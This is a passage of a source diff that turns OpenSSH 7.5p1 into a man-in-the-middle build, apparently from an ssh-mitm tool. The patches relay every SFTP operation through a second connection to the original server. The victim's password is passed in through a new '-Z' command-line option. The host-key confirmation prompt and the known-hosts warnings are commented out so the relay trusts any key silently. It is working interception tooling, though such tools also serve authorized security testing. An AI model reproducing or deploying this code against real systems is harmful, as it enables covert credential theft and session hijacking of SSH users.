 void	sftp_server_cleanup_exit(int) __attribute__((noreturn));
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-server.c openssh-7.5p1-mitm/sftp-server.c
--- openssh-7.5p1/sftp-server.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp-server.c	2017-07-12 12:32:03.997026526 -0400
@@ -39,6 +39,7 @@
 #include <time.h>
 #include <unistd.h>
 #include <stdarg.h>
+#include <sys/wait.h>
 
 #include "xmalloc.h"
 #include "sshbuf.h"
@@ -50,6 +51,7 @@
 
 #include "sftp.h"
 #include "sftp-common.h"
+#include "sftp-client.h"
 
 /* Our verbosity */
 static LogLevel log_level = SYSLOG_LEVEL_ERROR;
@@ -74,14 +76,11 @@
 /* Requests that are allowed/denied */
 static char *request_whitelist, *request_blacklist;
 
-/* portable attributes, etc. */
-typedef struct Stat Stat;
+pid_t sshpid = -1;
+volatile sig_atomic_t interrupted = 0;
+int showprogress = 0;
+extern struct sftp_conn *client_conn;
 
-struct Stat {
-	char *name;
-	char *long_name;
-	Attrib attrib;
-};
 
 /* Packet handlers */
 static void process_open(u_int32_t id);
@@ -108,6 +107,7 @@
 static void process_extended_hardlink(u_int32_t id);
 static void process_extended_fsync(u_int32_t id);
 static void process_extended(u_int32_t id);
+struct sftp_conn *make_connection(char *host, unsigned short port, char *username, char *password);
 
 struct sftp_handler {
 	const char *name;	/* user-visible name for fine-grained perms */
@@ -362,6 +362,7 @@
 	return NULL;
 }
 
+/*
 static DIR *
 handle_to_dir(int handle)
 {
@@ -369,6 +370,7 @@
 		return handles[handle].dirp;
 	return NULL;
 }
+*/
 
 static int
 handle_to_fd(int handle)
@@ -416,6 +418,7 @@
 	return 0;
 }
 
+/*
 static int
 handle_close(int handle)
 {
@@ -434,6 +437,7 @@
 	}
 	return ret;
 }
+*/
 
 static void
 handle_log_close(int handle, char *emsg)
@@ -477,6 +481,27 @@
 	return 0;
 }
 
+/* Handle return value must be free()'ed. */
+int
+get_handle_all(struct sshbuf *queue, u_char **handle_str, size_t *handle_len, int *handle_int)
+{
+	int r;
+
+	if ((r = sshbuf_get_string(queue, handle_str, handle_len)) != 0)
+	  return r;
+
+	if (*handle_len < 256)
+		*handle_int = handle_from_string(*handle_str, *handle_len);
+	else {
+		free(*handle_str); *handle_str = NULL;
+		*handle_len = 0;
+		*handle_int = -1;
+		return -1;
+	}
+
+	return 0;
+}
+
 /* send replies */
 
 static void
@@ -568,6 +593,14 @@
 }
 
 static void
+send_handle_str(u_int32_t id, u_char *handle, size_t handle_len)
+{
+	debug("request %u: sent handle_str handle %d", id, atoi(handle));
+	send_data_or_handle(SSH2_FXP_HANDLE, id, handle, handle_len);
+}
+
+
+static void
 send_names(u_int32_t id, int count, const Stat *stats)
 {
 	struct sshbuf *msg;
@@ -717,6 +750,7 @@
 static void
 process_close(u_int32_t id)
 {
+	/*
 	int r, handle, ret, status = SSH2_FX_FAILURE;
 
 	if ((r = get_handle(iqueue, &handle)) != 0)
@@ -727,6 +761,19 @@
 	ret = handle_close(handle);
 	status = (ret == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	send_status(id, status);
+	*/
+	int r;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	debug3("request %u: close handle %u", id, handle_int);
+	int status = mitm_do_close(client_conn, handle_str, handle_len);
+	debug3("request %u: close handle %u: returning %u", id, handle_int, status);
+	send_status(id, status);
+	free(handle_str); handle_str = NULL;
 }
 
 static void
@@ -814,18 +861,19 @@
 }
 
 static void
-process_do_stat(u_int32_t id, int do_lstat)
+process_do_stat(u_int32_t id, int do_lstat_arg)
 {
-	Attrib a;
-	struct stat st;
+	/*Attrib a;
+	struct stat st;*/
 	char *name;
 	int r, status = SSH2_FX_FAILURE;
 
 	if ((r = sshbuf_get_cstring(iqueue, &name, NULL)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 
-	debug3("request %u: %sstat", id, do_lstat ? "l" : "");
-	verbose("%sstat name \"%s\"", do_lstat ? "l" : "", name);
+	debug3("request %u: %sstat", id, do_lstat_arg ? "l" : "");
+	verbose("%sstat name \"%s\"", do_lstat_arg ? "l" : "", name);
+	/*
 	r = do_lstat ? lstat(name, &st) : stat(name, &st);
 	if (r < 0) {
 		status = errno_to_portable(errno);
@@ -836,6 +884,20 @@
 	}
 	if (status != SSH2_FX_OK)
 		send_status(id, status);
+	*/
+	Attrib *b;
+	if (do_lstat_arg) 
+		b = do_lstat(client_conn, name, 0, &status);
+	else
+		b = do_stat(client_conn, name, 0, &status);
+
+	if (b != NULL) {
+		debug3("%sstat(%s) returning non-NULL", do_lstat_arg ? "l" : "", name);
+		send_attrib(id, b);
+	} else {
+		debug3("%sstat(%s) returning status %u", do_lstat_arg ? "l" : "", name, status);
+		send_status(id, status);
+	}
 	free(name);
 }
 
@@ -854,10 +916,17 @@
 static void
 process_fstat(u_int32_t id)
 {
-	Attrib a;
-	struct stat st;
-	int fd, r, handle, status = SSH2_FX_FAILURE;
+	Attrib *a;
+	int status = SSH2_FX_FAILURE;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	int r;
 
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	/*
 	if ((r = get_handle(iqueue, &handle)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 	debug("request %u: fstat \"%s\" (handle %u)",
@@ -875,8 +944,16 @@
 	}
 	if (status != SSH2_FX_OK)
 		send_status(id, status);
+	*/
+	a = mitm_do_fstat(client_conn, handle_str, handle_len, 1, &status);
+	if (a != NULL)
+		send_attrib(id, a);
+	else
+		send_status(id, status);
+	free(handle_str);  handle_str = NULL;
 }
 
+/*
 static struct timeval *
 attrib_to_tv(const Attrib *a)
 {
@@ -888,6 +965,7 @@
 	tv[1].tv_usec = 0;
 	return tv;
 }
+*/
 
 static void
 process_setstat(u_int32_t id)
@@ -901,6 +979,7 @@
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 
 	debug("request %u: setstat name \"%s\"", id, name);
+	/*
 	if (a.flags & SSH2_FILEXFER_ATTR_SIZE) {
 		logit("set \"%s\" size %llu",
 		    name, (unsigned long long)a.size);
@@ -932,6 +1011,8 @@
 		if (r == -1)
 			status = errno_to_portable(errno);
 	}
+	*/
+	status = mitm_do_setstat(client_conn, name, &a);
 	send_status(id, status);
 	free(name);
 }
@@ -940,9 +1021,16 @@
 process_fsetstat(u_int32_t id)
 {
 	Attrib a;
-	int handle, fd, r;
 	int status = SSH2_FX_OK;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	int r;
 
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0 ||
+	    (r = decode_attrib(iqueue, &a)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	/*
 	if ((r = get_handle(iqueue, &handle)) != 0 ||
 	    (r = decode_attrib(iqueue, &a)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
@@ -998,12 +1086,16 @@
 				status = errno_to_portable(errno);
 		}
 	}
+	*/
+	status = mitm_do_fsetstat(client_conn, handle_str, handle_len, &a);
+	free(handle_str);  handle_str = NULL;
 	send_status(id, status);
 }
 
 static void
 process_opendir(u_int32_t id)
 {
+	/*
 	DIR *dirp = NULL;
 	char *path;
 	int r, handle, status = SSH2_FX_FAILURE;
@@ -1028,12 +1120,31 @@
 	}
 	if (status != SSH2_FX_OK)
 		send_status(id, status);
+	*/
+	int r, status = SSH2_FX_FAILURE;
+	char * path;
+	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
+	debug3("request %u: opendir", id);
+	logit("opendir \"%s\"", path);
+
+	size_t handle_len = 0;
+	u_char *handle_str = mitm_do_opendir(client_conn, path, &handle_len, &status);
+	if (handle_str != NULL) {
+	  debug3("opendir(%s) handle: %d", path, atoi(handle_str));
+	  send_handle_str(id, handle_str, handle_len);
+	} else {
+	  debug3("opendir(%s) status: %d", path, status);
+	  send_status(id, status);
+	}
 	free(path);
 }
 
 static void
 process_readdir(u_int32_t id)
 {
+	/*
 	DIR *dirp;
 	struct dirent *dp;
 	char *path;
@@ -1060,7 +1171,9 @@
 				nstats *= 2;
 				stats = xreallocarray(stats, nstats, sizeof(Stat));
 			}
+	*/
 /* XXX OVERFLOW ? */
+	/*
 			snprintf(pathname, sizeof pathname, "%s%s%s", path,
 			    strcmp(path, "/") ? "/" : "", dp->d_name);
 			if (lstat(pathname, &st) < 0)
@@ -1069,8 +1182,10 @@
 			stats[count].name = xstrdup(dp->d_name);
 			stats[count].long_name = ls_file(dp->d_name, &st, 0, 0);
 			count++;
+	*/
 			/* send up to 100 entries in one message */
 			/* XXX check packet size instead */
+	/*
 			if (count == 100)
 				break;
 		}
@@ -1085,6 +1200,32 @@
 		}
 		free(stats);
 	}
+	*/
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
+	int handle_int = -1;
+	int r;
+
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle_int)) != 0)
+		fatal("%s: buffer error", __func__);
+	debug("request %u: readdir(handle %d)", id, handle_int);
+
+	int status = 0;
+	u_int count = 0;
+	Stat *stats = mitm_do_readdir(client_conn, id, handle_str, handle_len, &count, &status);
+	if (stats == NULL) {
+	  debug("readdir(handle %d): returning status %d", handle_int, status);
+	  send_status(id, status);
+	} else {
+	  send_names(id, count, stats);
+	  for (u_int i = 0; i < count; i++) {
+	    debug("readdir(handle %d): returning \"%s\" / \"%s\"", handle_int, stats[i].name, stats[i].long_name);
+	    free(stats[i].name); stats[i].name = NULL;
+	    free(stats[i].long_name); stats[i].long_name = NULL;
+	  }
+	  free(stats); stats = NULL;
+	}
+	free(handle_str); handle_str = NULL;
 }
 
 static void
@@ -1098,9 +1239,13 @@
 
 	debug3("request %u: remove", id);
 	logit("remove name \"%s\"", name);
+	/*
 	r = unlink(name);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	send_status(id, status);
+	*/
+	status = mitm_do_rm(client_conn, name);
+	send_status(id, status);
 	free(name);
 }
 
@@ -1119,9 +1264,13 @@
 	    a.perm & 07777 : 0777;
 	debug3("request %u: mkdir", id);
 	logit("mkdir name \"%s\" mode 0%o", name, mode);
+	/*
 	r = mkdir(name, mode);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	send_status(id, status);
+	*/
+	status = mitm_do_mkdir(client_conn, name, &a);
+	send_status(id, status);
 	free(name);
 }
 
@@ -1136,16 +1285,19 @@
 
 	debug3("request %u: rmdir", id);
 	logit("rmdir name \"%s\"", name);
+	/*
 	r = rmdir(name);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	send_status(id, status);
+	*/
+	status = mitm_do_rmdir(client_conn, name);
+	send_status(id, status);
 	free(name);
 }
 
 static void
 process_realpath(u_int32_t id)
 {
-	char resolvedname[PATH_MAX];
 	char *path;
 	int r;
 
@@ -1158,6 +1310,7 @@
 	}
 	debug3("request %u: realpath", id);
 	verbose("realpath \"%s\"", path);
+	/*
 	if (realpath(path, resolvedname) == NULL) {
 		send_status(id, errno_to_portable(errno));
 	} else {
@@ -1166,6 +1319,13 @@
 		s.name = s.long_name = resolvedname;
 		send_names(id, 1, &s);
 	}
+	*/
+	char *realpath = do_realpath(client_conn, path);
+	Stat s;
+	attrib_clear(&s.attrib);
+	s.name = s.long_name = realpath;
+	send_names(id, 1, &s);
+	free(realpath); realpath = NULL;
 	free(path);
 }
 
@@ -1174,7 +1334,6 @@
 {
 	char *oldpath, *newpath;
 	int r, status;
-	struct stat sb;
 
 	if ((r = sshbuf_get_cstring(iqueue, &oldpath, NULL)) != 0 ||
 	    (r = sshbuf_get_cstring(iqueue, &newpath, NULL)) != 0)
@@ -1182,11 +1341,14 @@
 
 	debug3("request %u: rename", id);
 	logit("rename old \"%s\" new \"%s\"", oldpath, newpath);
+	/*
 	status = SSH2_FX_FAILURE;
 	if (lstat(oldpath, &sb) == -1)
 		status = errno_to_portable(errno);
 	else if (S_ISREG(sb.st_mode)) {
+	*/
 		/* Race-free rename of regular files */
+	/*
 		if (link(oldpath, newpath) == -1) {
 			if (errno == EOPNOTSUPP || errno == ENOSYS
 #ifdef EXDEV
@@ -1198,10 +1360,12 @@
 			    ) {
 				struct stat st;
 
+	*/
 				/*
 				 * fs doesn't support links, so fall back to
 				 * stat+rename.  This is racy.
 				 */
+	/*
 				if (stat(newpath, &st) == -1) {
 					if (rename(oldpath, newpath) == -1)
 						status =
@@ -1214,7 +1378,9 @@
 			}
 		} else if (unlink(oldpath) == -1) {
 			status = errno_to_portable(errno);
+	*/
 			/* clean spare link */
+	/*
 			unlink(newpath);
 		} else
 			status = SSH2_FX_OK;
@@ -1224,6 +1390,8 @@
 		else
 			status = SSH2_FX_OK;
 	}
+	*/
+	status = mitm_do_rename(client_conn, oldpath, newpath, 1);
 	send_status(id, status);
 	free(oldpath);
 	free(newpath);
@@ -1232,15 +1400,18 @@
 static void
 process_readlink(u_int32_t id)
 {
-	int r, len;
-	char buf[PATH_MAX];
+	int r;
 	char *path;
+	u_int status = 0;
+	char *filename = NULL, *long_name = NULL;
+	Attrib a;
 
 	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 
 	debug3("request %u: readlink", id);
 	verbose("readlink \"%s\"", path);
+	/*
 	if ((len = readlink(path, buf, sizeof(buf) - 1)) == -1)
 		send_status(id, errno_to_portable(errno));
 	else {
@@ -1251,6 +1422,18 @@
 		s.name = s.long_name = buf;
 		send_names(id, 1, &s);
 	}
+	*/
+	if (mitm_do_readlink(client_conn, path, &status, &filename, &long_name, &a) == 1) {
+		Stat s;
+		s.name = filename;
+		s.long_name = long_name;
+		s.attrib = a;
+		send_names(id, 1, &s);
+	} else
+		send_status(id, status);
+
+	free(filename); filename = NULL;
+	free(long_name); long_name = NULL;
 	free(path);
 }
 
@@ -1267,8 +1450,11 @@
 	debug3("request %u: symlink", id);
 	logit("symlink old \"%s\" new \"%s\"", oldpath, newpath);
 	/* this will fail if 'newpath' exists */
+	/*
 	r = symlink(oldpath, newpath);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+	*/
+	status = mitm_do_symlink(client_conn, oldpath, newpath);
 	send_status(id, status);
 	free(oldpath);
 	free(newpath);
@@ -1286,8 +1472,11 @@
 
 	debug3("request %u: posix-rename", id);
 	logit("posix-rename old \"%s\" new \"%s\"", oldpath, newpath);
+	/*
 	r = rename(oldpath, newpath);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+	*/
+	status = mitm_do_rename(client_conn, oldpath, newpath, 0);
 	send_status(id, status);
 	free(oldpath);
 	free(newpath);
@@ -1299,29 +1488,46 @@
 	char *path;
 	struct statvfs st;
 	int r;
+	u_int status = 0;
 
 	if ((r = sshbuf_get_cstring(iqueue, &path, NULL)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
 	debug3("request %u: statvfs", id);
 	logit("statvfs \"%s\"", path);
 
+	/*
 	if (statvfs(path, &st) != 0)
 		send_status(id, errno_to_portable(errno));
 	else
 		send_statvfs(id, &st);
+	*/
+	if (mitm_do_statvfs(client_conn, path, &st, &status) != -1)
+		send_statvfs(id, &st);
+	else
+		send_status(id, status);
+
         free(path);
 }
 
 static void
 process_extended_fstatvfs(u_int32_t id)
 {
-	int r, handle, fd;
+	int r, handle;
 	struct statvfs st;
+	u_int status = 0;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
 
+	/*
 	if ((r = get_handle(iqueue, &handle)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	*/
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
 	debug("request %u: fstatvfs \"%s\" (handle %u)",
 	    id, handle_to_name(handle), handle);
+	/*
 	if ((fd = handle_to_fd(handle)) < 0) {
 		send_status(id, SSH2_FX_FAILURE);
 		return;
@@ -1330,6 +1536,13 @@
 		send_status(id, errno_to_portable(errno));
 	else
 		send_statvfs(id, &st);
+	*/
+	if (mitm_do_fstatvfs(client_conn, handle_str, handle_len, &st, &status) != -1)
+		send_statvfs(id, &st);
+	else
+		send_status(id, status);
+
+	free(handle_str); handle_str = NULL;
 }
 
 static void
@@ -1344,8 +1557,11 @@
 
 	debug3("request %u: hardlink", id);
 	logit("hardlink old \"%s\" new \"%s\"", oldpath, newpath);
+	/*
 	r = link(oldpath, newpath);
 	status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
+	*/
+	status = mitm_do_hardlink(client_conn, oldpath, newpath);
 	send_status(id, status);
 	free(oldpath);
 	free(newpath);
@@ -1354,19 +1570,30 @@
 static void
 process_extended_fsync(u_int32_t id)
 {
-	int handle, fd, r, status = SSH2_FX_OP_UNSUPPORTED;
+	int handle, r, status = SSH2_FX_OP_UNSUPPORTED;
+	u_char *handle_str = NULL;
+	size_t handle_len = 0;
 
+	/*
 	if ((r = get_handle(iqueue, &handle)) != 0)
 		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+	*/
+	if ((r = get_handle_all(iqueue, &handle_str, &handle_len, &handle)) != 0)
+		fatal("%s: buffer error: %s", __func__, ssh_err(r));
+
 	debug3("request %u: fsync (handle %u)", id, handle);
 	verbose("fsync \"%s\"", handle_to_name(handle));
+	/*
 	if ((fd = handle_to_fd(handle)) < 0)
 		status = SSH2_FX_NO_SUCH_FILE;
 	else if (handle_is_ok(handle, HANDLE_FILE)) {
 		r = fsync(fd);
 		status = (r == -1) ? errno_to_portable(errno) : SSH2_FX_OK;
 	}
+	*/
+	status = mitm_do_fsync(client_conn, handle_str, handle_len);
 	send_status(id, status);
+	free(handle_str); handle_str = NULL;
 }
 
 static void
@@ -1485,19 +1712,17 @@
 static void
 sftp_server_usage(void)
 {
-	extern char *__progname;
-
 	fprintf(stderr,
 	    "usage: %s [-ehR] [-d start_directory] [-f log_facility] "
 	    "[-l log_level]\n\t[-P blacklisted_requests] "
 	    "[-p whitelisted_requests] [-u umask]\n"
 	    "       %s -Q protocol_feature\n",
-	    __progname, __progname);
+	    "/usr/libexec/sftp-server", "/usr/libexec/sftp-server");
 	exit(1);
 }
 
 int
-sftp_server_main(int argc, char **argv, struct passwd *user_pw)
+sftp_server_main(int argc, char **argv, struct passwd *user_pw, char *original_host, unsigned short original_port, char *username, char *password)
 {
 	fd_set *rset, *wset;
 	int i, r, in, out, max, ch, skipargs = 0, log_stderr = 0;
@@ -1553,10 +1778,12 @@
 				error("Invalid log facility \"%s\"", optarg);
 			break;
 		case 'd':
+			/*
 			cp = tilde_expand_filename(optarg, user_pw->pw_uid);
 			homedir = percent_expand(cp, "d", user_pw->pw_dir,
 			    "u", user_pw->pw_name, (char *)NULL);
 			free(cp);
+			*/
 			break;
 		case 'p':
 			if (request_whitelist != NULL)
@@ -1638,6 +1865,7 @@
 		}
 	}
 
+	client_conn = make_connection(original_host, original_port, username, password);
 	set_size = howmany(max + 1, NFDBITS) * sizeof(fd_mask);
 	for (;;) {
 		memset(rset, 0, set_size);
@@ -1706,3 +1934,115 @@
 			    __func__, ssh_err(r));
 	}
 }
+
+/* Copied from sftp.c. */
+/* ARGSUSED */
+static void
+killchild(int signo)
+{
+	if (sshpid > 1) {
+		kill(sshpid, SIGTERM);
+		waitpid(sshpid, NULL, 0);
+	}
+
+	_exit(1);
+}
+
+/* Copied from sftp.c. */
+/* ARGSUSED */
+static void
+suspchild(int signo)
+{
+	if (sshpid > 1) {
+		kill(sshpid, signo);
+		while (waitpid(sshpid, NULL, WUNTRACED) == -1 && errno == EINTR)
+			continue;
+	}
+	kill(getpid(), SIGSTOP);
+}
+
+/* Copied from sftp.c. */
+static void
+connect_to_server(char *path, char **args, int *in, int *out)
+{
+	int c_in, c_out;
+
+#ifdef USE_PIPES
+	int pin[2], pout[2];
+
+	if ((pipe(pin) == -1) || (pipe(pout) == -1))
+		fatal("pipe: %s", strerror(errno));
+	*in = pin[0];
+	*out = pout[1];
+	c_in = pout[0];
+	c_out = pin[1];
+#else /* USE_PIPES */
+	int inout[2];
+
+	if (socketpair(AF_UNIX, SOCK_STREAM, 0, inout) == -1)
+		fatal("socketpair: %s", strerror(errno));
+	*in = *out = inout[0];
+	c_in = c_out = inout[1];
+#endif /* USE_PIPES */
+
+	if ((sshpid = fork()) == -1)
+		fatal("fork: %s", strerror(errno));
+	else if (sshpid == 0) {
+		if ((dup2(c_in, STDIN_FILENO) == -1) ||
+		    (dup2(c_out, STDOUT_FILENO) == -1)) {
+			fprintf(stderr, "dup2: %s\n", strerror(errno));
+			_exit(1);
+		}
+		close(*in);
+		close(*out);
+		close(c_in);
+		close(c_out);
+
+		/*
+		 * The underlying ssh is in the same process group, so we must
+		 * ignore SIGINT if we want to gracefully abort commands,
+		 * otherwise the signal will make it to the ssh process and
+		 * kill it too.  Contrawise, since sftp sends SIGTERMs to the
+		 * underlying ssh, it must *not* ignore that signal.
+		 */
+		signal(SIGINT, SIG_IGN);
+		signal(SIGTERM, SIG_DFL);
+
+		execvp(path, args);
+		fprintf(stderr, "exec: %s: %s\n", path, strerror(errno));
+		_exit(1);
+	}
+
+	signal(SIGTERM, killchild);
+	signal(SIGINT, killchild);
+	signal(SIGHUP, killchild);
+	signal(SIGTSTP, suspchild);
+	signal(SIGTTIN, suspchild);
+	signal(SIGTTOU, suspchild);
+	close(c_in);
+	close(c_out);
+}
+
+struct sftp_conn *
+make_connection(char *host, unsigned short port, char *username, char *password) {
+	arglist args;
+	char *ssh_program = "/home/ssh-mitm/bin/ssh";
+	int in = -1, out = -1;
+
+	args.list = NULL;
+	addargs(&args, "%s", ssh_program);
+	addargs(&args, "-Z");
+	addargs(&args, "%s", password);
+	addargs(&args, "-oForwardX11=no");
+	addargs(&args, "-oForwardAgent=no");
+	addargs(&args, "-oPermitLocalCommand=no");
+	addargs(&args, "-oClearAllForwardings=yes");
+	addargs(&args, "-oPort=%u", port);
+	addargs(&args, "-oProtocol=2");
+	addargs(&args, "-s");
+	addargs(&args, "--");
+	addargs(&args, "%s@%s", username, host);
+	addargs(&args, "sftp");
+	connect_to_server(ssh_program, args.list, &in, &out);
+	return do_init(in, out, 32768, 64, 0);
+}
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-server-main.c openssh-7.5p1-mitm/sftp-server-main.c
--- openssh-7.5p1/sftp-server-main.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sftp-server-main.c	2017-07-07 16:47:34.693012896 -0400
@@ -21,6 +21,7 @@
 #include <pwd.h>
 #include <stdarg.h>
 #include <stdio.h>
+#include <string.h>
 #include <unistd.h>
 
 #include "log.h"
@@ -38,6 +39,12 @@
 main(int argc, char **argv)
 {
 	struct passwd *user_pw;
+	char **new_argv;
+
+	if (argc < 4) {
+		fprintf(stderr, "Error: at least four arguments necessary.\n");
+		return 1;
+	}
 
 	ssh_malloc_init();	/* must be called before any mallocs */
 	/* Ensure that fds 0, 1 and 2 are open or directed to /dev/null */
@@ -49,5 +56,11 @@
 		return 1;
 	}
 
-	return (sftp_server_main(argc, argv, user_pw));
+	new_argv = calloc(argc - 4, sizeof(char *));
+
+	new_argv[0] = strdup(argv[0]);
+	for (int i = 1; i < argc - 4; i++)
+		new_argv[i] = strdup(argv[i + 4]);
+
+	return (sftp_server_main(argc - 4, new_argv, user_pw, argv[1], (unsigned short)atoi(argv[2]), argv[3], argv[4]));
 }
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/ssh.c openssh-7.5p1-mitm/ssh.c
--- openssh-7.5p1/ssh.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/ssh.c	2017-07-06 12:52:17.029320213 -0400
@@ -524,6 +524,7 @@
 	struct addrinfo *addrs = NULL;
 	struct ssh_digest_ctx *md;
 	u_char conn_hash[SSH_DIGEST_MAX_LENGTH];
+	char *password = NULL;
 
 	ssh_malloc_init();	/* must be called before any mallocs */
 	/* Ensure that fds 0, 1 and 2 are open or directed to /dev/null */
@@ -605,8 +606,9 @@
 	argv0 = av[0];
 
  again:
+	/* Add -Z to get the password to use.  TODO: change to a temp file? */
 	while ((opt = getopt(ac, av, "1246ab:c:e:fgi:kl:m:no:p:qstvx"
-	    "ACD:E:F:GI:J:KL:MNO:PQ:R:S:TVw:W:XYy")) != -1) {
+	    "ACD:E:F:GI:J:KL:MNO:PQ:R:S:TVw:W:XYyZ:")) != -1) {
 		switch (opt) {
 		case '1':
 			options.protocol = SSH_PROTO_1;
@@ -931,6 +933,9 @@
 		case 'F':
 			config = optarg;
 			break;
+		case 'Z':
+			password = strdup(optarg);
+			break;
 		default:
 			usage();
 		}
@@ -1292,6 +1297,7 @@
 	sensitive_data.nkeys = 0;
 	sensitive_data.keys = NULL;
 	sensitive_data.external_keysign = 0;
+	sensitive_data.password = password;
 	if (options.rhosts_rsa_authentication ||
 	    options.hostbased_authentication) {
 		sensitive_data.nkeys = 9;
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect2.c openssh-7.5p1-mitm/sshconnect2.c
--- openssh-7.5p1/sshconnect2.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sshconnect2.c	2017-07-06 12:52:17.029320213 -0400
@@ -906,7 +906,8 @@
 
 	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
 	    authctxt->server_user, host);
-	password = read_passphrase(prompt, 0);
+	/* password = read_passphrase(prompt, 0); */
+	password = strdup(authctxt->sensitive->password);  /* TODO: zero out password field now? */
 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
 	packet_put_cstring(authctxt->server_user);
 	packet_put_cstring(authctxt->service);
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect.c openssh-7.5p1-mitm/sshconnect.c
--- openssh-7.5p1/sshconnect.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sshconnect.c	2017-07-06 12:52:17.029320213 -0400
@@ -916,10 +916,12 @@
 				    "address '%.128s' to the list of known "
 				    "hosts (%.500s).", type, ip,
 				    user_hostfiles[0]);
-			else
-				logit("Warning: Permanently added the %s host "
+			/* Suppress the warning about adding this host key. */
+			/*else
+			  logit("Warning: Permanently added the %s host "
 				    "key for IP address '%.128s' to the list "
-				    "of known hosts.", type, ip);
+				    "of known hosts.", type, ip);*/
+
 		} else if (options.visual_host_key) {
 			fp = sshkey_fingerprint(host_key,
 			    options.fingerprint_hash, SSH_FP_DEFAULT);
@@ -995,8 +997,8 @@
 			    msg2);
 			free(ra);
 			free(fp);
-			if (!confirm(msg))
-				goto fail;
+			/*if (!confirm(msg))
+			  goto fail;*/
 			hostkey_trusted = 1; /* user explicitly confirmed */
 		}
 		/*
@@ -1023,13 +1025,17 @@
 			    host_key, options.hash_known_hosts);
 			hostp = host;
 		}
+		/* Suppress compiler warning about hostp being set but not
+		 * used. */
+		if (hostp) {}
 
 		if (!r)
 			logit("Failed to add the host to the list of known "
 			    "hosts (%.500s).", user_hostfiles[0]);
-		else
+		/* Suppress the warning message about adding to known_hosts  */
+		/*else
 			logit("Warning: Permanently added '%.200s' (%s) to the "
-			    "list of known hosts.", hostp, type);
+			"list of known hosts.", hostp, type);*/
 		break;
 	case HOST_REVOKED:
 		error("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshconnect.h openssh-7.5p1-mitm/sshconnect.h
--- openssh-7.5p1/sshconnect.h	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sshconnect.h	2017-07-06 12:52:17.029320213 -0400
@@ -29,6 +29,7 @@
 	Key	**keys;
 	int	nkeys;
 	int	external_keysign;
+	char	*password;
 };
 
 struct addrinfo;
diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sshd.c openssh-7.5p1-mitm/sshd.c
--- openssh-7.5p1/sshd.c	2017-03-19 22:39:27.000000000 -0400
+++ openssh-7.5p1-mitm/sshd.c	2017-07-06 12:52:17.029320213 -0400
@@ -72,6 +72,8 @@
 #include <string.h>
 #include <unistd.h>
 #include <limits.h>
+#include <arpa/inet.h>
+#include <linux/netfilter_ipv4.h>
 
 #ifdef WITH_OPENSSL
 #include <openssl/dh.h>
